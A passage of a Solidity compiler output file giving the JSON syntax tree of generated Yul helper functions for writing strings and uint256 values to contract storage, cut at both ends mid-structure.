eType":"YulIdentifier","src":"3212:4:10"}],"functionName":{"name":"not","nativeSrc":"3208:3:10","nodeType":"YulIdentifier","src":"3208:3:10"},"nativeSrc":"3208:9:10","nodeType":"YulFunctionCall","src":"3208:9:10"}],"functionName":{"name":"and","nativeSrc":"3197:3:10","nodeType":"YulIdentifier","src":"3197:3:10"},"nativeSrc":"3197:21:10","nodeType":"YulFunctionCall","src":"3197:21:10"},"variableNames":[{"name":"value","nativeSrc":"3188:5:10","nodeType":"YulIdentifier","src":"3188:5:10"}]},{"nativeSrc":"3227:40:10","nodeType":"YulAssignment","src":"3227:40:10","value":{"arguments":[{"name":"value","nativeSrc":"3240:5:10","nodeType":"YulIdentifier","src":"3240:5:10"},{"arguments":[{"name":"toInsert","nativeSrc":"3251:8:10","nodeType":"YulIdentifier","src":"3251:8:10"},{"name":"mask","nativeSrc":"3261:4:10","nodeType":"YulIdentifier","src":"3261:4:10"}],"functionName":{"name":"and","nativeSrc":"3247:3:10","nodeType":"YulIdentifier","src":"3247:3:10"},"nativeSrc":"3247:19:10","nodeType":"YulFunctionCall","src":"3247:19:10"}],"functionName":{"name":"or","nativeSrc":"3237:2:10","nodeType":"YulIdentifier","src":"3237:2:10"},"nativeSrc":"3237:30:10","nodeType":"YulFunctionCall","src":"3237:30:10"},"variableNames":[{"name":"result","nativeSrc":"3227:6:10","nodeType":"YulIdentifier","src":"3227:6:10"}]}]},"name":"update_byte_slice_dynamic32","nativeSrc":"2880:393:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"2917:5:10","nodeType":"YulTypedName","src":"2917:5:10","type":""},{"name":"shiftBytes","nativeSrc":"2924:10:10","nodeType":"YulTypedName","src":"2924:10:10","type":""},{"name":"toInsert","nativeSrc":"2936:8:10","nodeType":"YulTypedName","src":"2936:8:10","type":""}],"returnVariables":[{"name":"result","nativeSrc":"2949:6:10","nodeType":"YulTypedName","src":"2949:6:10","type":""}],"src":"2880:393:10"},{"body":{"nativeSrc":"3311:28:10","nodeType":"YulBlock","src":"3311:28:10","statements":[{"nativeSrc":"3321:12:10","nodeType":"YulAssignment","src":"3321:12:10","value":{"name":"value","nativeSrc":"3328:5:10","nodeType":"YulIdentifier","src":"3328:5:10"},"variableNames":[{"name":"ret","nativeSrc":"3321:3:10","nodeType":"YulIdentifier","src":"3321:3:10"}]}]},"name":"identity","nativeSrc":"3279:60:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"3297:5:10","nodeType":"YulTypedName","src":"3297:5:10","type":""}],"returnVariables":[{"name":"ret","nativeSrc":"3307:3:10","nodeType":"YulTypedName","src":"3307:3:10","type":""}],"src":"3279:60:10"},{"body":{"nativeSrc":"3405:82:10","nodeType":"YulBlock","src":"3405:82:10","statements":[{"nativeSrc":"3415:66:10","nodeType":"YulAssignment","src":"3415:66:10","value":{"arguments":[{"arguments":[{"arguments":[{"name":"value","nativeSrc":"3473:5:10","nodeType":"YulIdentifier","src":"3473:5:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"3455:17:10","nodeType":"YulIdentifier","src":"3455:17:10"},"nativeSrc":"3455:24:10","nodeType":"YulFunctionCall","src":"3455:24:10"}],"functionName":{"name":"identity","nativeSrc":"3446:8:10","nodeType":"YulIdentifier","src":"3446:8:10"},"nativeSrc":"3446:34:10","nodeType":"YulFunctionCall","src":"3446:34:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"3428:17:10","nodeType":"YulIdentifier","src":"3428:17:10"},"nativeSrc":"3428:53:10","nodeType":"YulFunctionCall","src":"3428:53:10"},"variableNames":[{"name":"converted","nativeSrc":"3415:9:10","nodeType":"YulIdentifier","src":"3415:9:10"}]}]},"name":"convert_t_uint256_to_t_uint256","nativeSrc":"3345:142:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"3385:5:10","nodeType":"YulTypedName","src":"3385:5:10","type":""}],"returnVariables":[{"name":"converted","nativeSrc":"3395:9:10","nodeType":"YulTypedName","src":"3395:9:10","type":""}],"src":"3345:142:10"},{"body":{"nativeSrc":"3540:28:10","nodeType":"YulBlock","src":"3540:28:10","statements":[{"nativeSrc":"3550:12:10","nodeType":"YulAssignment","src":"3550:12:10","value":{"name":"value","nativeSrc":"3557:5:10","nodeType":"YulIdentifier","src":"3557:5:10"},"variableNames":[{"name":"ret","nativeSrc":"3550:3:10","nodeType":"YulIdentifier","src":"3550:3:10"}]}]},"name":"prepare_store_t_uint256","nativeSrc":"3493:75:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"3526:5:10","nodeType":"YulTypedName","src":"3526:5:10","type":""}],"returnVariables":[{"name":"ret","nativeSrc":"3536:3:10","nodeType":"YulTypedName","src":"3536:3:10","type":""}],"src":"3493:75:10"},{"body":{"nativeSrc":"3650:193:10","nodeType":"YulBlock","src":"3650:193:10","statements":[{"nativeSrc":"3660:63:10","nodeType":"YulVariableDeclaration","src":"3660:63:10","value":{"arguments":[{"name":"value_0","nativeSrc":"3715:7:10","nodeType":"YulIdentifier","src":"3715:7:10"}],"functionName":{"name":"convert_t_uint256_to_t_uint256","nativeSrc":"3684:30:10","nodeType":"YulIdentifier","src":"3684:30:10"},"nativeSrc":"3684:39:10","nodeType":"YulFunctionCall","src":"3684:39:10"},"variables":[{"name":"convertedValue_0","nativeSrc":"3664:16:10","nodeType":"YulTypedName","src":"3664:16:10","type":""}]},{"expression":{"arguments":[{"name":"slot","nativeSrc":"3739:4:10","nodeType":"YulIdentifier","src":"3739:4:10"},{"arguments":[{"arguments":[{"name":"slot","nativeSrc":"3779:4:10","nodeType":"YulIdentifier","src":"3779:4:10"}],"functionName":{"name":"sload","nativeSrc":"3773:5:10","nodeType":"YulIdentifier","src":"3773:5:10"},"nativeSrc":"3773:11:10","nodeType":"YulFunctionCall","src":"3773:11:10"},{"name":"offset","nativeSrc":"3786:6:10","nodeType":"YulIdentifier","src":"3786:6:10"},{"arguments":[{"name":"convertedValue_0","nativeSrc":"3818:16:10","nodeType":"YulIdentifier","src":"3818:16:10"}],"functionName":{"name":"prepare_store_t_uint256","nativeSrc":"3794:23:10","nodeType":"YulIdentifier","src":"3794:23:10"},"nativeSrc":"3794:41:10","nodeType":"YulFunctionCall","src":"3794:41:10"}],"functionName":{"name":"update_byte_slice_dynamic32","nativeSrc":"3745:27:10","nodeType":"YulIdentifier","src":"3745:27:10"},"nativeSrc":"3745:91:10","nodeType":"YulFunctionCall","src":"3745:91:10"}],"functionName":{"name":"sstore","nativeSrc":"3732:6:10","nodeType":"YulIdentifier","src":"3732:6:10"},"nativeSrc":"3732:105:10","nodeType":"YulFunctionCall","src":"3732:105:10"},"nativeSrc":"3732:105:10","nodeType":"YulExpressionStatement","src":"3732:105:10"}]},"name":"update_storage_value_t_uint256_to_t_uint256","nativeSrc":"3574:269:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"slot","nativeSrc":"3627:4:10","nodeType":"YulTypedName","src":"3627:4:10","type":""},{"name":"offset","nativeSrc":"3633:6:10","nodeType":"YulTypedName","src":"3633:6:10","type":""},{"name":"value_0","nativeSrc":"3641:7:10","nodeType":"YulTypedName","src":"3641:7:10","type":""}],"src":"3574:269:10"},{"body":{"nativeSrc":"3898:24:10","nodeType":"YulBlock","src":"3898:24:10","statements":[{"nativeSrc":"3908:8:10","nodeType":"YulAssignment","src":"3908:8:10","value":{"kind":"number","nativeSrc":"3915:1:10","nodeType":"YulLiteral","src":"3915:1:10","type":"","value":"0"},"variableNames":[{"name":"ret","nativeSrc":"3908:3:10","nodeType":"YulIdentifier","src":"3908:3:10"}]}]},"name":"zero_value_for_split_t_uint256","nativeSrc":"3849:73:10","nodeType":"YulFunctionDefinition","returnVariables":[{"name":"ret","nativeSrc":"3894:3:10","nodeType":"YulTypedName","src":"3894:3:10","type":""}],"src":"3849:73:10"},{"body":{"nativeSrc":"3981:136:10","nodeType":"YulBlock","src":"3981:136:10","statements":[{"nativeSrc":"3991:46:10","nodeType":"YulVariableDeclaration","src":"3991:46:10","value":{"arguments":[],"functionName":{"name":"zero_value_for_split_t_uint256","nativeSrc":"4005:30:10","nodeType":"YulIdentifier","src":"4005:30:10"},"nativeSrc":"4005:32:10","nodeType":"YulFunctionCall","src":"4005:32:10"},"variables":[{"name":"zero_0","nativeSrc":"3995:6:10","nodeType":"YulTypedName","src":"3995:6:10","type":""}]},{"expression":{"arguments":[{"name":"slot","nativeSrc":"4090:4:10","nodeType":"YulIdentifier","src":"4090:4:10"},{"name":"offset","nativeSrc":"4096:6:10","nodeType":"YulIdentifier","src":"4096:6:10"},{"name":"zero_0","nativeSrc":"4104:6:10","nodeType":"YulIdentifier","src":"4104:6:10"}],"functionName":{"name":"update_storage_value_t_uint256_to_t_uint256","nativeSrc":"4046:43:10","nodeType":"YulIdentifier","src":"4046:43:10"},"nativeSrc":"4046:65:10","nodeType":"YulFunctionCall","src":"4046:65:10"},"nativeSrc":"4046:65:10","nodeType":"YulExpressionStatement","src":"4046:65:10"}]},"name":"storage_set_to_zero_t_uint256","nativeSrc":"3928:189:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"slot","nativeSrc":"3967:4:10","nodeType":"YulTypedName","src":"3967:4:10","type":""},{"name":"offset","nativeSrc":"3973:6:10","nodeType":"YulTypedName","src":"3973:6:10","type":""}],"src":"3928:189:10"},{"body":{"nativeSrc":"4173:136:10","nodeType":"YulBlock","src":"4173:136:10","statements":[{"body":{"nativeSrc":"4240:63:10","nodeType":"YulBlock","src":"4240:63:10","statements":[{"expression":{"arguments":[{"name":"start","nativeSrc":"4284:5:10","nodeType":"YulIdentifier","src":"4284:5:10"},{"kind":"number","nativeSrc":"4291:1:10","nodeType":"YulLiteral","src":"4291:1:10","type":"","value":"0"}],"functionName":{"name":"storage_set_to_zero_t_uint256","nativeSrc":"4254:29:10","nodeType":"YulIdentifier","src":"4254:29:10"},"nativeSrc":"4254:39:10","nodeType":"YulFunctionCall","src":"4254:39:10"},"nativeSrc":"4254:39:10","nodeType":"YulExpressionStatement","src":"4254:39:10"}]},"condition":{"arguments":[{"name":"start","nativeSrc":"4193:5:10","nodeType":"YulIdentifier","src":"4193:5:10"},{"name":"end","nativeSrc":"4200:3:10","nodeType":"YulIdentifier","src":"4200:3:10"}],"functionName":{"name":"lt","nativeSrc":"4190:2:10","nodeType":"YulIdentifier","src":"4190:2:10"},"nativeSrc":"4190:14:10","nodeType":"YulFunctionCall","src":"4190:14:10"},"nativeSrc":"4183:120:10","nodeType":"YulForLoop","post":{"nativeSrc":"4205:26:10","nodeType":"YulBlock","src":"4205:26:10","statements":[{"nativeSrc":"4207:22:10","nodeType":"YulAssignment","src":"4207:22:10","value":{"arguments":[{"name":"start","nativeSrc":"4220:5:10","nodeType":"YulIdentifier","src":"4220:5:10"},{"kind":"number","nativeSrc":"4227:1:10","nodeType":"YulLiteral","src":"4227:1:10","type":"","value":"1"}],"functionName":{"name":"add","nativeSrc":"4216:3:10","nodeType":"YulIdentifier","src":"4216:3:10"},"nativeSrc":"4216:13:10","nodeType":"YulFunctionCall","src":"4216:13:10"},"variableNames":[{"name":"start","nativeSrc":"4207:5:10","nodeType":"YulIdentifier","src":"4207:5:10"}]}]},"pre":{"nativeSrc":"4187:2:10","nodeType":"YulBlock","src":"4187:2:10","statements":[]},"src":"4183:120:10"}]},"name":"clear_storage_range_t_bytes1","nativeSrc":"4123:186:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"start","nativeSrc":"4161:5:10","nodeType":"YulTypedName","src":"4161:5:10","type":""},{"name":"end","nativeSrc":"4168:3:10","nodeType":"YulTypedName","src":"4168:3:10","type":""}],"src":"4123:186:10"},{"body":{"nativeSrc":"4394:464:10","nodeType":"YulBlock","src":"4394:464:10","statements":[{"body":{"nativeSrc":"4420:431:10","nodeType":"YulBlock","src":"4420:431:10","statements":[{"nativeSrc":"4434:54:10","nodeType":"YulVariableDeclaration","src":"4434:54:10","value":{"arguments":[{"name":"array","nativeSrc":"4482:5:10","nodeType":"YulIdentifier","src":"4482:5:10"}],"functionName":{"name":"array_dataslot_t_string_storage","nativeSrc":"4450:31:10","nodeType":"YulIdentifier","src":"4450:31:10"},"nativeSrc":"4450:38:10","nodeType":"YulFunctionCall","src":"4450:38:10"},"variables":[{"name":"dataArea","nativeSrc":"4438:8:10","nodeType":"YulTypedName","src":"4438:8:10","type":""}]},{"nativeSrc":"4501:63:10","nodeType":"YulVariableDeclaration","src":"4501:63:10","value":{"arguments":[{"name":"dataArea","nativeSrc":"4524:8:10","nodeType":"YulIdentifier","src":"4524:8:10"},{"arguments":[{"name":"startIndex","nativeSrc":"4552:10:10","nodeType":"YulIdentifier","src":"4552:10:10"}],"functionName":{"name":"divide_by_32_ceil","nativeSrc":"4534:17:10","nodeType":"YulIdentifier","src":"4534:17:10"},"nativeSrc":"4534:29:10","nodeType":"YulFunctionCall","src":"4534:29:10"}],"functionName":{"name":"add","nativeSrc":"4520:3:10","nodeType":"YulIdentifier","src":"4520:3:10"},"nativeSrc":"4520:44:10","nodeType":"YulFunctionCall","src":"4520:44:10"},"variables":[{"name":"deleteStart","nativeSrc":"4505:11:10","nodeType":"YulTypedName","src":"4505:11:10","type":""}]},{"body":{"nativeSrc":"4721:27:10","nodeType":"YulBlock","src":"4721:27:10","statements":[{"nativeSrc":"4723:23:10","nodeType":"YulAssignment","src":"4723:23:10","value":{"name":"dataArea","nativeSrc":"4738:8:10","nodeType":"YulIdentifier","src":"4738:8:10"},"variableNames":[{"name":"deleteStart","nativeSrc":"4723:11:10","nodeType":"YulIdentifier","src":"4723:11:10"}]}]},"condition":{"arguments":[{"name":"startIndex","nativeSrc":"4705:10:10","nodeType":"YulIdentifier","src":"4705:10:10"},{"kind":"number","nativeSrc":"4717:2:10","nodeType":"YulLiteral","src":"4717:2:10","type":"","value":"32"}],"functionName":{"name":"lt","nativeSrc":"4702:2:10","nodeType":"YulIdentifier","src":"4702:2:10"},"nativeSrc":"4702:18:10","nodeType":"YulFunctionCall","src":"4702:18:10"},"nativeSrc":"4699:49:10","nodeType":"YulIf","src":"4699:49:10"},{"expression":{"arguments":[{"name":"deleteStart","nativeSrc":"4790:11:10","nodeType":"YulIdentifier","src":"4790:11:10"},{"arguments":[{"name":"dataArea","nativeSrc":"4807:8:10","nodeType":"YulIdentifier","src":"4807:8:10"},{"arguments":[{"name":"len","nativeSrc":"4835:3:10","nodeType":"YulIdentifier","src":"4835:3:10"}],"functionName":{"name":"divide_by_32_ceil","nativeSrc":"4817:17:10","nodeType":"YulIdentifier","src":"4817:17:10"},"nativeSrc":"4817:22:10","nodeType":"YulFunctionCall","src":"4817:22:10"}],"functionName":{"name":"add","nativeSrc":"4803:3:10","nodeType":"YulIdentifier","src":"4803:3:10"},"nativeSrc":"4803:37:10","nodeType":"YulFunctionCall","src":"4803:37:10"}],"functionName":{"name":"clear_storage_range_t_bytes1","nativeSrc":"4761:28:10","nodeType":"YulIdentifier","src":"4761:28:10"},"nativeSrc":"4761:80:10","nodeType":"YulFunctionCall","src":"4761:80:10"},"nativeSrc":"4761:80:10","nodeType":"YulExpressionStatement","src":"4761:80:10"}]},"condition":{"arguments":[{"name":"len","nativeSrc":"4411:3:10","nodeType":"YulIdentifier","src":"4411:3:10"},{"kind":"number","nativeSrc":"4416:2:10","nodeType":"YulLiteral","src":"4416:2:10","type":"","value":"31"}],"functionName":{"name":"gt","nativeSrc":"4408:2:10","nodeType":"YulIdentifier","src":"4408:2:10"},"nativeSrc":"4408:11:10","nodeType":"YulFunctionCall","src":"4408:11:10"},"nativeSrc":"4405:446:10","nodeType":"YulIf","src":"4405:446:10"}]},"name":"clean_up_bytearray_end_slots_t_string_storage","nativeSrc":"4315:543:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"array","nativeSrc":"4370:5:10","nodeType":"YulTypedName","src":"4370:5:10","type":""},{"name":"len","nativeSrc":"4377:3:10","nodeType":"YulTypedName","src":"4377:3:10","type":""},{"name":"startIndex","nativeSrc":"4382:10:10","nodeType":"YulTypedName","src":"4382:10:10","type":""}],"src":"4315:543:10"},{"body":{"nativeSrc":"4927:54:10","nodeType":"YulBlock","src":"4927:54:10","statements":[{"nativeSrc":"4937:37:10","nodeType":"YulAssignment","src":"4937:37:10","value":{"arguments":[{"name":"bits","nativeSrc":"4962:4:10","nodeType":"YulIdentifier","src":"4962:4:10"},{"name":"value","nativeSrc":"4968:5:10","nodeType":"YulIdentifier","src":"4968:5:10"}],"functionName":{"name":"shr","nativeSrc":"4958:3:10","nodeType":"YulIdentifier","src":"4958:3:10"},"nativeSrc":"4958:16:10","nodeType":"YulFunctionCall","src":"4958:16:10"},"variableNames":[{"name":"newValue","nativeSrc":"4937:8:10","nodeType":"YulIdentifier","src":"4937:8:10"}]}]},"name":"shift_right_unsigned_dynamic","nativeSrc":"4864:117:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"bits","nativeSrc":"4902:4:10","nodeType":"YulTypedName","src":"4902:4:10","type":""},{"name":"value","nativeSrc":"4908:5:10","nodeType":"YulTypedName","src":"4908:5:10","type":""}],"returnVariables":[{"name":"newValue","nativeSrc":"4918:8:10","nodeType":"YulTypedName","src":"4918:8:10","type":""}],"src":"4864:117:10"},{"body":{"nativeSrc":"5038:118:10","nodeType":"YulBlock","src":"5038:118:10","statements":[{"nativeSrc":"5048:68:10","nodeType":"YulVariableDeclaration","src":"5048:68:10","value":{"arguments":[{"arguments":[{"arguments":[{"kind":"number","nativeSrc":"5097:1:10","nodeType":"YulLiteral","src":"5097:1:10","type":"","value":"8"},{"name":"bytes","nativeSrc":"5100:5:10","nodeType":"YulIdentifier","src":"5100:5:10"}],"functionName":{"name":"mul","nativeSrc":"5093:3:10","nodeType":"YulIdentifier","src":"5093:3:10"},"nativeSrc":"5093:13:10","nodeType":"YulFunctionCall","src":"5093:13:10"},{"arguments":[{"kind":"number","nativeSrc":"5112:1:10","nodeType":"YulLiteral","src":"5112:1:10","type":"","value":"0"}],"functionName":{"name":"not","nativeSrc":"5108:3:10","nodeType":"YulIdentifier","src":"5108:3:10"},"nativeSrc":"5108:6:10","nodeType":"YulFunctionCall","src":"5108:6:10"}],"functionName":{"name":"shift_right_unsigned_dynamic","nativeSrc":"5064:28:10","nodeType":"YulIdentifier","src":"5064:28:10"},"nativeSrc":"5064:51:10","nodeType":"YulFunctionCall","src":"5064:51:10"}],"functionName":{"name":"not","nativeSrc":"5060:3:10","nodeType":"YulIdentifier","src":"5060:3:10"},"nativeSrc":"5060:56:10","nodeType":"YulFunctionCall","src":"5060:56:10"},"variables":[{"name":"mask","nativeSrc":"5052:4:10","nodeType":"YulTypedName","src":"5052:4:10","type":""}]},{"nativeSrc":"5125:25:10","nodeType":"YulAssignment","src":"5125:25:10","value":{"arguments":[{"name":"data","nativeSrc":"5139:4:10","nodeType":"YulIdentifier","src":"5139:4:10"},{"name":"mask","nativeSrc":"5145:4:10","nodeType":"YulIdentifier","src":"5145:4:10"}],"functionName":{"name":"and","nativeSrc":"5135:3:10","nodeType":"YulIdentifier","src":"5135:3:10"},"nativeSrc":"5135:15:10","nodeType":"YulFunctionCall","src":"5135:15:10"},"variableNames":[{"name":"result","nativeSrc":"5125:6:10","nodeType":"YulIdentifier","src":"5125:6:10"}]}]},"name":"mask_bytes_dynamic","nativeSrc":"4987:169:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"data","nativeSrc":"5015:4:10","nodeType":"YulTypedName","src":"5015:4:10","type":""},{"name":"bytes","nativeSrc":"5021:5:10","nodeType":"YulTypedName","src":"5021:5:10","type":""}],"returnVariables":[{"name":"result","nativeSrc":"5031:6:10","nodeType":"YulTypedName","src":"5031:6:10","type":""}],"src":"4987:169:10"},{"body":{"nativeSrc":"5242:214:10","nodeType":"YulBlock","src":"5242:214:10","statements":[{"nativeSrc":"5375:37:10","nodeType":"YulAssignment","src":"5375:37:10","value":{"arguments":[{"name":"data","nativeSrc":"5402:4:10","nodeType":"YulIdentifier","src":"5402:4:10"},{"name":"len","nativeSrc":"5408:3:10","nodeType":"YulIdentifier","src":"5408:3:10"}],"functionName":{"name":"mask_bytes_dynamic","nativeSrc":"5383:18:10","nodeType":"YulIdentifier","src":"5383:18:10"},"nativeSrc":"5383:29:10","nodeType":"YulFunctionCall","src":"5383:29:10"},"variableNames":[{"name":"data","nativeSrc":"5375:4:10","nodeType":"YulIdentifier","src":"5375:4:10"}]},{"nativeSrc":"5421:29:10","nodeType":"YulAssignment","src":"5421:29:10","value":{"arguments":[{"name":"data","nativeSrc":"5432:4:10","nodeType":"YulIdentifier","src":"5432:4:10"},{"arguments":[{"kind":"number","nativeSrc":"5442:1:10","nodeType":"YulLiteral","src":"5442:1:10","type":"","value":"2"},{"name":"len","nativeSrc":"5445:3:10","nodeType":"YulIdentifier","src":"5445:3:10"}],"functionName":{"name":"mul","nativeSrc":"5438:3:10","nodeType":"YulIdentifier","src":"5438:3:10"},"nativeSrc":"5438:11:10","nodeType":"YulFunctionCall","src":"5438:11:10"}],"functionName":{"name":"or","nativeSrc":"5429:2:10","nodeType":"YulIdentifier","src":"5429:2:10"},"nativeSrc":"5429:21:10","nodeType":"YulFunctionCall","src":"5429:21:10"},"variableNames":[{"name":"used","nativeSrc":"5421:4:10","nodeType":"YulIdentifier","src":"5421:4:10"}]}]},"name":"extract_used_part_and_set_length_of_short_byte_array","nativeSrc":"5161:295:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"data","nativeSrc":"5223:4:10","nodeType":"YulTypedName","src":"5223:4:10","type":""},{"name":"len","nativeSrc":"5229:3:10","nodeType":"YulTypedName","src":"5229:3:10","type":""}],"returnVariables":[{"name":"used","nativeSrc":"5237:4:10","nodeType":"YulTypedName","src":"5237:4:10","type":""}],"src":"5161:295:10"},{"body":{"nativeSrc":"5553:1303:10","nodeType":"YulBlock","src":"5553:1303:10","statements":[{"nativeSrc":"5564:51:10","nodeType":"YulVariableDeclaration","src":"5564:51:10","value":{"arguments":[{"name":"src","nativeSrc":"5611:3:10","nodeType":"YulIdentifier","src":"5611:3:10"}],"functionName":{"name":"array_length_t_string_memory_ptr","nativeSrc":"5578:32:10","nodeType":"YulIdentifier","src":"5578:32:10"},"nativeSrc":"5578:37:10","nodeType":"YulFunctionCall","src":"5578:37:10"},"variables":[{"name":"newLen","nativeSrc":"5568:6:10","nodeType":"YulTypedName","src":"5568:6:10","type":""}]},{"body":{"nativeSrc":"5700:22:10","nodeType":"YulBlock","src":"5700:22:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x41","nativeSrc":"5702:16:10","nodeType":"YulIdentifier","src":"5702:16:10"},"nativeSrc":"5702:18:10","nodeType":"YulFunctionCall","src":"5702:18:10"},"nativeSrc":"5702:18:10","nodeType":"YulExpressionStatement","src":"5702:18:10"}]},"condition":{"arguments":[{"name":"newLen","nativeSrc":"5672:6:10","nodeType":"YulIdentifier","src":"5672:6:10"},{"kind":"number","nativeSrc":"5680:18:10","nodeType":"YulLiteral","src":"5680:18:10","type":"","value":"0xffffffffffffffff"}],"functionName":{"name":"gt","nativeSrc":"5669:2:10","nodeType":"YulIdentifier","src":"5669:2:10"},"nativeSrc":"5669:30:10","nodeType":"YulFunctionCall","src":"5669:30:10"},"nativeSrc":"5666:56:10","nodeType":"YulIf","src":"5666:56:10"},{"nativeSrc":"5732:52:10","nodeType":"YulVariableDeclaration","src":"5732:52:10","value":{"arguments":[{"arguments":[{"name":"slot","nativeSrc":"5778:4:10","nodeType":"YulIdentifier","src":"5778:4:10"}],"functionName":{"name":"sload","nativeSrc":"5772:5:10","nodeType":"YulIdentifier","src":"5772:5:10"},"nativeSrc":"5772:11:10","nodeType":"YulFunctionCall","src":"5772:11:10"}],"functionName":{"name":"extract_byte_array_length","nativeSrc":"5746:25:10","nodeType":"YulIdentifier","src":"5746:25:10"},"nativeSrc":"5746:38:10","nodeType":"YulFunctionCall","src":"5746:38:10"},"variables":[{"name":"oldLen","nativeSrc":"5736:6:10","nodeType":"YulTypedName","src":"5736:6:10","type":""}]},{"expression":{"arguments":[{"name":"slot","nativeSrc":"5877:4:10","nodeType":"YulIdentifier","src":"5877:4:10"},{"name":"oldLen","nativeSrc":"5883:6:10","nodeType":"YulIdentifier","src":"5883:6:10"},{"name":"newLen","nativeSrc":"5891:6:10","nodeType":"YulIdentifier","src":"5891:6:10"}],"functionName":{"name":"clean_up_bytearray_end_slots_t_string_storage","nativeSrc":"5831:45:10","nodeType":"YulIdentifier","src":"5831:45:10"},"nativeSrc":"5831:67:10","nodeType":"YulFunctionCall","src":"5831:67:10"},"nativeSrc":"5831:67:10","nodeType":"YulExpressionStatement","src":"5831:67:10"},{"nativeSrc":"5908:18:10","nodeType":"YulVariableDeclaration","src":"5908:18:10","value":{"kind":"number","nativeSrc":"5925:1:10","nodeType":"YulLiteral","src":"5925:1:10","type":"","value":"0"},"variables":[{"name":"srcOffset","nativeSrc":"5912:9:10","nodeType":"YulTypedName","src":"5912:9:10","type":""}]},{"nativeSrc":"5936:17:10","nodeType":"YulAssignment","src":"5936:17:10","value":{"kind":"number","nativeSrc":"5949:4:10","nodeType":"YulLiteral","src":"5949:4:10","type":"","value":"0x20"},"variableNames":[{"name":"srcOffset","nativeSrc":"5936:9:10","nodeType":"YulIdentifier","src":"5936:9:10"}]},{"cases":[{"body":{"nativeSrc":"6000:611:10","nodeType":"YulBlock","src":"6000:611:10","statements":[{"nativeSrc":"6014:37:10","nodeType":"YulVariableDeclaration","src":"6014:37:10","value":{"arguments":[{"name":"newLen","nativeSrc":"6033:6:10","nodeType":"YulIdentifier","src":"6033:6:10"},{"arguments":[{"kind":"number","nativeSrc":"6045:4:10","nodeType":"YulLiteral","src":"6045:4:10","type":"","value":"0x1f"}],"functionName":{"name":"not","nativeSrc":"6041:3:10","nodeType":"YulIdentifier","src":"6041:3:10"},"nativeSrc":"6041:9:10","nodeType":"YulFunctionCall","src":"6041:9:10"}],"functionName":{"name":"and","nativeSrc":"6029:3:10","nodeType":"YulIdentifier","src":"6029:3:10"},"nativeSrc":"6029:22:10","nodeType":"YulFunctionCall","src":"6029:22:10"},"variables":[{"name":"loopEnd","nativeSrc":"6018:7:10","nodeType":"YulTypedName","src":"6018:7:10","type":""}]},{"nativeSrc":"6065:51:10","nodeType":"YulVariableDeclaration","src":"6065:51:10","value":{"arguments":[{"name":"slot","nativeSrc":"6111:4:10","nodeType":"YulIdentifier","src":"6111:4:10"}],"functionName":{"name":"array_dataslot_t_string_storage","nativeSrc":"6079:31:10","nodeType":"YulIdentifier","src":"6079:31:10"},"nativeSrc":"6079:37:10","nodeType":"YulFunctionCall","src":"6079:37:10"},"variables":[{"name":"dstPtr","nativeSrc":"6069:6:10","nodeType":"YulTypedName","src":"6069:6:10","type":""}]},{"nativeSrc":"6129:10:10","nodeType":"YulVariableDeclaration","src":"6129:10:10","value":{"kind":"number","nativeSrc":"6138:1:10","nodeType":"YulLiteral","src":"6138:1:10","type":"","value":"0"},"variables":[{"name":"i","nativeSrc":"6133:1:10","nodeType":"YulTypedName","src":"6133:1:10","type":""}]},{"body":{"nativeSrc":"6197:163:10","nodeType":"YulBlock","src":"6197:163:10","statements":[{"expression":{"arguments":[{"name":"dstPtr","nativeSrc":"6222:6:10","nodeType":"YulIdentifier","src":"6222:6:10"},{"arguments":[{"arguments":[{"name":"src","nativeSrc":"6240:3:10","nodeType":"YulIdentifier","src":"6240:3:10"},{"name":"srcOffset","nativeSrc":"6245:9:10","nodeType":"YulIdentifier","src":"6245:9:10"}],"functionName":{"name":"add","nativeSrc":"6236:3:10","nodeType":"YulIdentifier","src":"6236:3:10"},"nativeSrc":"6236:19:10","nodeType":"YulFunctionCall","src":"6236:19:10"}],"functionName":{"name":"mload","nativeSrc":"6230:5:10","nodeType":"YulIdentifier","src":"6230:5:10"},"nativeSrc":"6230:26:10","nodeType":"YulFunctionCall","src":"6230:26:10"}],"functionName":{"name":"sstore","nativeSrc":"6215:6:10","nodeType":"YulIdentifier","src":"6215:6:10"},"nativeSrc":"6215:42:10","nodeType":"YulFunctionCall","src":"6215:42:10"},"nativeSrc":"6215:42:10","nodeType":"YulExpressionStatement","src":"6215:42:10"},{"nativeSrc":"6274:24:10","nodeType":"YulAssignment","src":"6274:24:10","value":{"arguments":[{"name":"dstPtr","nativeSrc":"6288:6:10","nodeType":"YulIdentifier","src":"6288:6:10"},{"kind":"number","nativeSrc":"6296:1:10","nodeType":"YulLiteral","src":"6296:1:10","type":"","value":"1"}],"functionName":{"name":"add","nativeSrc":"6284:3:10","nodeType":"YulIdentifier","src":"6284:3:10"},"nativeSrc":"6284:14:10","nodeType":"YulFunctionCall","src":"6284:14:10"},"variableNames":[{"name":"dstPtr","nativeSrc":"6274:6:10","nodeType":"YulIdentifier","src":"6274:6:10"}]},{"nativeSrc":"6315:31:10","nodeType":"YulAssignment","src":"6315:31:10","value":{"arguments":[{"name":"srcOffset","nativeSrc":"6332:9:10","nodeType":"YulIdentifier","src":"6332:9:10"},{"kind":"number","nativeSrc":"6343:2:10","nodeType":"YulLiteral","src":"6343:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"6328:3:10","nodeType":"YulIdentifier","src":"6328:3:10"},"nativeSrc":"6328:18:10","nodeType":"YulFunctionCall","src":"6328:18:10"},"variableNames":[{"name":"srcOffset","nativeSrc":"6315:9:10","nodeType":"YulIdentifier","src":"6315:9:10"}]}]},"condition":{"arguments":[{"name":"i","nativeSrc":"6163:1:10","nodeType":"YulIdentifier","src":"6163:1:10"},{"name":"loopEnd","nativeSrc":"6166:7:10","nodeType":"YulIdentifier","src":"6166:7:10"}],"functionName":{"name":"lt","nativeSrc":"6160:2